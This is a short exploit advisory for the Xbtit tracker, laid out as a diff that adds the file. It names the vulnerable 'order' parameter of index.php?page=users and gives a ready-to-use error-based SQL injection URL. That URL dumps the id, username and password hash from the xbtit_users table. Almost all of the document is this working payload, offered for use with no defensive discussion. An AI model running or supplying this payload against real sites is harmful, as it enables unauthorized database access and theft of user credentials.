@@ -1,0 +1,16 @@
+####################################################
+# Title     : Xbtit SQL Injection Vulnerability    #
+# Author    : Ctacok                               #
+# Homepage  : http://ctacok.ru/                    #
+####################################################
+   
+####################################################
+#  Vulnerable File : 
+ /index.php?page=users&order=[SQL]&by=ASC
+   
+####################################################
+#  ExploiT         : 
+   
+/index.php?page=users&order=flag+or(1,1)=(select+count(0),concat((select+concat(0x3a3a3a,id,0x3a,username,0x3a,password,0x3a3a3a)+from+xbtit_users+limit+1,1),floor(rand(0)*2))from(information_schema.tables)group+by+2)--++&by=ASC
+
+####################################################
